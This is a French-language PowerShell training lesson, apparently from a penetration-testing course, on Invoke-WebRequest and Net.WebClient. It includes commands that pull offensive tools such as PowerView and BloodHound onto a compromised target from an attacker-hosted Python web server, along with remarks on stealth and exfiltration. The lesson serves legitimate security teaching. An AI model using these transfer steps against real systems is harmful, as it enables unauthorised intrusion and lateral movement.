En tant qu'administrateur, nous pouvons `automatiser` la manière dont nous effectuons les mises à jour à distance, installons des applications, et bien plus encore avec des outils et des cmdlets via PowerShell. Cela garantira que nous pouvons obtenir les logiciels, les mises à jour et les autres objets dont nous avons besoin sur des hôtes locaux et distants sans avoir à les rechercher manuellement via l'interface graphique (GUI). Cela nous fera gagner du temps et nous permettra d'administrer les hôtes à distance au lieu d'être assis devant leur clavier ou de nous y connecter en RDP. En tant que pentester, c'est un moyen rapide d'introduire les outils et autres éléments dont nous avons besoin dans l'environnement et d'exfiltrer des données si nous disposons de l'infrastructure nécessaire pour les y envoyer. Cette section expliquera comment interagir avec le Web et montrera plusieurs façons d'utiliser PowerShell à cette fin.

---

## Comment interagir avec le Web en utilisant PowerShell ?

Lorsqu'il s'agit d'interagir avec le Web via PowerShell, le cmdlet [Invoke-WebRequest](https://learn.microsoft.com/bs-latn-ba/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-5.1) est notre champion. Nous pouvons l'utiliser pour effectuer des requêtes HTTP/HTTPS de base (comme `GET` et `POST`), analyser des pages HTML, télécharger des fichiers, nous authentifier et même maintenir une session avec un site. Il est très polyvalent et facile à utiliser dans les scripts et l'automatisation. Si vous préférez les alias, le cmdlet Invoke-WebRequest a pour alias `wget`, `iwr` et `curl`. Ceux qui sont familiers avec les fondamentaux de Linux connaissent peut-être cURL et wget, car ils sont utilisés pour télécharger des fichiers depuis la ligne de commande dans les distributions Linux. Jetons un coup d'œil à l'aide de Invoke-WebRequest pendant une minute.

#### Aide de Invoke-WebRequest

        powershell
``PS C:\Windows\system32> Get-Help Invoke-Webrequest  NAME     Invoke-WebRequest  SYNOPSIS     Gets content from a web page on the Internet.   SYNTAX     Invoke-WebRequest [-Uri] <System.Uri> [-Body <System.Object>] [-Certificate     <System.Security.Cryptography.X509Certificates.X509Certificate>] [-CertificateThumbprint <System.String>]     [-ContentType <System.String>] [-Credential <System.Management.Automation.PSCredential>] [-DisableKeepAlive]     [-Headers <System.Collections.IDictionary>] [-InFile <System.String>] [-MaximumRedirection <System.Int32>]     [-Method {Default | Get | Head | Post | Put | Delete | Trace | Options | Merge | Patch}] [-OutFile     <System.String>] [-PassThru] [-Proxy <System.Uri>] [-ProxyCredential <System.Management.Automation.PSCredential>]     [-ProxyUseDefaultCredentials] [-SessionVariable <System.String>] [-TimeoutSec <System.Int32>] [-TransferEncoding     {chunked | compress | deflate | gzip | identity}] [-UseBasicParsing] [-UseDefaultCredentials] [-UserAgent     <System.String>] [-WebSession <Microsoft.PowerShell.Commands.WebRequestSession>] [<CommonParameters>]  DESCRIPTION     The `Invoke-WebRequest` cmdlet sends HTTP, HTTPS, FTP, and FILE requests to a web page or web service. It parses     the response and returns collections of forms, links, images, and other significant HTML elements.      This cmdlet was introduced in Windows PowerShell 3.0.      > [!NOTE] > By default, script code in the web page may be run when the page is being parsed to populate the >     `ParsedHtml` property. Use the `-UseBasicParsing` switch to suppress this.      > [!IMPORTANT] > The examples in this article reference hosts in the `contoso.com` domain. This is a fictitious >     domain used by Microsoft for examples. The examples are designed to show how to use the cmdlets. > However, since     the `contoso.com` sites don't exist, the examples don't work. Adapt the examples > to hosts in your environment.  <SNIP>``

Remarquez que le synopsis de la sortie de Get-Help indique :

« `Récupère le contenu d'une page web sur Internet.` »

Bien qu'il s'agisse de sa fonctionnalité principale, nous pouvons également l'utiliser pour obtenir du contenu que nous hébergeons sur des serveurs web dans le même environnement réseau. Nous en avons vanté les mérites, essayons maintenant d'effectuer une requête web simple avec Invoke-WebRequest.

---

## Une requête web simple

Nous pouvons effectuer une requête Get de base sur un site web en utilisant le modificateur `-Method GET` avec le cmdlet Invoke-WebRequest, comme indiqué ci-dessous. Pour cet exemple, nous spécifierons l'URI `https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html`. Nous l'enverrons également à `Get-Member` pour inspecter les méthodes et les propriétés de l'objet en sortie.

#### Requête Get avec Invoke-WebRequest

        powershell
`PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member      TypeName: Microsoft.PowerShell.Commands.HtmlWebResponseObject  ----              ---------- ---------- Dispose           Method     void Dispose(), void IDisposable.Dispose() Equals            Method     bool Equals(System.Object obj) GetHashCode       Method     int GetHashCode() GetType           Method     type GetType() ToString          Method     string ToString() AllElements       Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection AllElements... BaseResponse      Property   System.Net.WebResponse BaseResponse {get;set;} Content           Property   string Content {get;} Forms             Property   Microsoft.PowerShell.Commands.FormObjectCollection Forms {get;} Headers           Property   System.Collections.Generic.Dictionary[string,string] Headers {get;} Images            Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Images {get;} InputFields       Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection InputFields... Links             Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Links {get;} ParsedHtml        Property   mshtml.IHTMLDocument2 ParsedHtml {get;} RawContent        Property   string RawContent {get;set;} RawContentLength  Property   long RawContentLength {get;} RawContentStream  Property   System.IO.MemoryStream RawContentStream {get;} Scripts           Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Scripts {get;} StatusCode        Property   int StatusCode {get;} StatusDescription Property   string StatusDescription {get;}`

Remarquez toutes les différentes propriétés que ce site possède. Nous pouvons maintenant filtrer sur celles-ci si nous souhaitons n'afficher qu'une partie du site. Par exemple, que se passerait-il si nous voulions simplement voir une liste des images du site ? Nous pouvons le faire en effectuant la requête, puis en filtrant uniquement sur `Images` comme suit :

#### Filtrage du contenu entrant

        powershell
`PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images  Images : {@{innerHTML=; innerText=; outerHTML=<IMG alt="Pretty Picture"          src="example/prettypicture.jpg">; outerText=; tagName=IMG; alt=Pretty Picture;          src=example/prettypicture.jpg}, @{innerHTML=; innerText=; outerHTML=<IMG alt="Pretty          Picture" src="example/prettypicture.jpg" align=top>; outerText=; tagName=IMG; alt=Pretty          Picture; src=example/prettypicture.jpg; align=top}}`

Nous avons maintenant une liste facile à lire des images incluses dans le site web, et nous pouvons les télécharger si nous le souhaitons. C'est un moyen très simple d'obtenir uniquement les informations que nous souhaitons voir. Le contenu brut du site web que nous énumérons ressemble à ceci :

#### Contenu brut

        powershell
`PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent  RawContent : HTTP/1.1 200 OK              Strict-Transport-Security: max-age=16070400              X-Content-Type-Options: nosniff              X-XSS-Protection: 1; mode=block              X-Frame-Options: SAMEORIGIN              Accept-Ranges: bytes              Content-Length: 1807              Content-Type: text/html              Date: Thu, 10 Nov 2022 16:25:07 GMT              ETag: "70f-529340fa7b28d"              Last-Modified: Wed, 13 Jan 2016 09:47:41 GMT              Server: Apache/2.4.6 () OpenSSL/1.0.2k-fips               <html>               <head>              <title>A very simple webpage</title>              <basefont size=4>              </head>               <body bgcolor=FFFFFF>               <h1>A very simple webpage. This is an "h1" level header.</h1>               <h2>This is a level h2 header.</h2>               <h6>This is a level h6 header.  Pretty small!</h6>               <p>This is a standard paragraph.</p>               <p align=center>Now I've aligned it in the center of the screen.</p>               <p align=right>Now aligned to the right</p>               <p><b>Bold text</b></p>               <p><strong>Strongly emphasized text</strong>  Can you tell the difference vs. bold?</p>               <p><i>Italics</i></p>               <p><em>Emphasized text</em>  Just like Italics!</p>               <p>Here is a pretty picture: <img src=example/prettypicture.jpg alt="Pretty              Picture"></p> <SNIP>`

Nous pourrions extraire le `contenu brut` de ce site au lieu de tout regarder d'un coup dans la requête. Remarquez comme c'est plus facile à lire. Comme moyen rapide de faire de la reconnaissance sur un site web ou d'en extraire des informations clés, telles que des noms, des adresses et des e-mails, il n'y a pas plus simple. Là où `Invoke-WebRequest` devient pratique, c'est sa capacité à télécharger des fichiers via l'interface en ligne de commande (CLI). Voyons maintenant comment télécharger des fichiers.

---

## Télécharger des fichiers avec PowerShell

Qu'il s'agisse de tâches d'administration système, de missions de pentest ou de reprise après sinistre, il faudra inévitablement télécharger des fichiers de toutes sortes sur un hôte Windows. Lors d'une mission de pentest, nous pouvons avoir compromis une cible et vouloir transférer des outils sur cet hôte pour continuer à énumérer l'environnement et identifier des moyens d'atteindre d'autres hôtes et réseaux. PowerShell nous offre des options intégrées pour ce faire. Nous nous concentrerons sur Invoke-WebRequest dans ce module, mais sachez qu'il existe de nombreuses manières différentes (certaines prévues à cet effet, d'autres non intentionnelles de la part des créateurs d'outils) d'effectuer des requêtes web et des téléchargements.

### Télécharger PowerView.ps1 depuis GitHub

Nous pouvons nous entraîner à utiliser Invoke-WebRequest en téléchargeant un outil populaire utilisé par de nombreux pentesters appelé [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

#### Télécharger sur notre hôte

        powershell
`PS C:\> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"  PS C:\> dir       Directory: C:\   Mode                 LastWriteTime         Length Name ----                 -------------         ------ ---- d-----          6/5/2021   5:10 AM                PerfLogs d-r---         7/25/2022   7:36 AM                Program Files d-r---          6/5/2021   7:37 AM                Program Files (x86) d-r---         7/30/2022  10:21 AM                Users d-----         7/21/2022  11:28 AM                Windows -a----         8/10/2022   9:12 AM        7299504 PowerView.ps1`

L'utilisation de Invoke-WebRequest est simple ; nous spécifions le cmdlet et l'URL exacte de la ressource que nous voulons télécharger :

`-Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"`

Après l'URL, nous spécifions l'emplacement et le nom de fichier de la ressource sur le système Windows depuis lequel nous la téléchargeons :

`-OutFile "C:\PowerView.ps1"`

Nous pouvons également utiliser Invoke-WebRequest pour télécharger des fichiers depuis des serveurs web sur le réseau local ou un réseau accessible depuis la cible Windows. Il est courant d'avoir besoin de transférer des fichiers de notre machine attaquante vers une cible Windows. L'un des avantages de cette méthode est que si l'un de nos objectifs pendant un pentest est de rester aussi furtif que possible, nous n'aurons peut-être pas besoin de générer des requêtes vers Internet que les équipements de sécurité réseau pourraient détecter en périmètre de réseau. Si nous avions déjà PowerView.ps1 stocké sur notre `machine attaquante`, nous pourrions utiliser un simple serveur web Python pour héberger PowerView.ps1 et le télécharger depuis la cible.

### Exemple de chemin pour introduire des outils dans un environnement

Si nous avions déjà PowerView.ps1 stocké sur notre `machine attaquante`, nous pourrions utiliser un simple serveur web Python pour héberger PowerView.ps1 et le télécharger depuis la cible. Depuis la machine attaquante, nous voulons confirmer que le fichier est déjà présent ou que nous devons le télécharger. Dans cet exemple, nous pouvons supposer qu'il se trouve déjà sur la machine attaquante à des fins de démonstration.

#### Utiliser ls pour voir le fichier (Machine Attaquante)

        shellsession
`ppporrkkky@htb[/htb]$ ls  Dictionaries            Get-HttpStatus.ps1                    Invoke-Portscan.ps1          PowerView.ps1  Recon.psd1 Get-ComputerDetail.ps1  Invoke-CompareAttributesForClass.ps1  Invoke-ReverseDnsLookup.ps1  README.md      Recon.psm1`

Nous démarrons un simple serveur web Python dans le répertoire où se trouve PowerView.ps1.

#### Démarrage du serveur web Python (Machine Attaquante)

        shellsession
`ppporrkkky@htb[/htb]$ python3 -m http.server 8000  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...`

Ensuite, nous téléchargerions le fichier hébergé depuis la machine attaquante en utilisant Invoke-WebRequest.

#### Téléchargement de PowerView.ps1 depuis le serveur web (de la machine attaquante à l'hôte cible)

        powershell
`Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"`

Comme nous l'avons vu précédemment, nous pouvons utiliser le cmdlet Invoke-WebRequest pour envoyer des commandes à des hôtes distants. Cela peut être très utile, surtout lorsque nous découvrons des vulnérabilités qui nous permettent d'exécuter des commandes sur une cible Windows mais sans avoir d'accès via un shell interactif ou une session de bureau à distance. Cela pourrait nous permettre de télécharger des fichiers sur l'hôte cible, ce qui nous permettrait d'étendre notre accès à cette cible et de nous déplacer vers d'autres sur le réseau. Les méthodes de transfert de fichiers sont abordées plus en détail dans le module [File Transfers](https://academy.hackthebox.com/module/details/24).

### Et si nous ne pouvons pas utiliser Invoke-WebRequest ?

Alors, que se passe-t-il si, pour une raison quelconque, nous ne pouvons pas utiliser `Invoke-WebRequest` ? N'ayez crainte, Windows propose plusieurs méthodes différentes pour interagir avec les clients web. La première voie d'interaction, plus complexe, consiste à utiliser la classe [.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-7.0). Cette classe pratique est un appel .Net que nous pouvons utiliser car Windows utilise et comprend .Net. Cette classe contient des méthodes system.net standard pour interagir avec des ressources via un URI (des adresses web comme github.com/project/tool.ps1). Voyons un exemple :

#### Téléchargement avec .Net.WebClient

        powershell
`PS C:\htb> (New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")  PS C:\htb> ls      Directory: C:\Users\MTanaka  Mode                 LastWriteTime         Length Name ----                 -------------         ------ ---- -a---          11/10/2022 10:45 AM      108511752 Bloodhound.zip -a---           6/14/2022  8:22 AM           4418 passwords.kdbx -a---            9/9/2020  4:54 PM         696576 Start.exe -a---           9/11/2021 12:58 PM              0 sticky.gpr -a---          11/10/2022 10:44 AM      108511752 test.zip`

Ça a donc fonctionné. Décortiquons ce que nous avons fait :

- D'abord, nous avons le « cradle » de téléchargement `(New-Object Net.WebClient).DownloadFile()`, qui est la façon dont nous lui disons d'exécuter notre requête.
- Ensuite, nous devons inclure l'URI du fichier que nous voulons télécharger comme premier paramètre dans les (). Pour cet exemple, c'était `"https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip"`.
- Enfin, nous devons indiquer à la commande où nous voulons que le fichier soit écrit avec le deuxième paramètre, `, "BloodHound.zip"`.

La commande ci-dessus aurait téléchargé le fichier dans le répertoire de travail actuel sous le nom `Bloodhound.zip`. En regardant notre terminal, nous pouvons voir que l'exécution a réussi car le fichier `Bloodhound.zip` existe maintenant dans notre `répertoire de travail`. Si nous voulions le placer ailleurs, nous aurions dû spécifier le chemin complet. À partir de là, nous pouvons `extraire` les outils et les exécuter comme bon nous semble. Gardez à l'esprit que cette méthode est bruyante car vous aurez des requêtes web entrant et sortant de votre réseau ainsi que des lectures et écritures de fichiers, donc elle `LAISSERA` des journaux (logs). Si vos transferts sont effectués localement, d'hôte à hôte par exemple, vous ne laissez des journaux que sur ces hôtes, qui sont un peu plus difficiles à analyser et laissent moins de traces puisque nous n'écrivons pas de journaux d'entrée/sortie (ingress/egress) au niveau du périmètre du client.

---

## Conclusion

Cette section n'a fait qu'effleurer la surface de ce que nous pourrions faire avec PowerShell pour interagir avec le Web. Assurez-vous de prendre le temps de pratiquer les différents types de requêtes que vous pouvez envoyer et même les nombreuses façons de filtrer et d'utiliser les informations que vous obtenez. À partir de maintenant, nous allons passer à l'automatisation avec PowerShell et voir comment elle peut nous être bénéfique.